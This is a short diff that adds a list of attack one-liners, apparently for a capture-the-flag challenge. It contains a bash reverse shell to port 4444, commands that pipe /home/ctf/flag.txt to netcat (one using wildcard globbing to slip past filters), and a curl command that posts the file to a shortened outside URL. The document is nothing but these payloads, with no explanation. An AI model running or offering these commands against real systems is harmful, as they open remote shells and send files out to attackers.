@@ -1,0 +1,7 @@
+bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'
+
+cat /home/ctf/flag.txt|nc 0.0.0.0 4444
+
+cat /h*/c*/f*|nc 0.0.0.0 4444
+
+curl t.ly/JkkZE -d@/h*/c*/f*
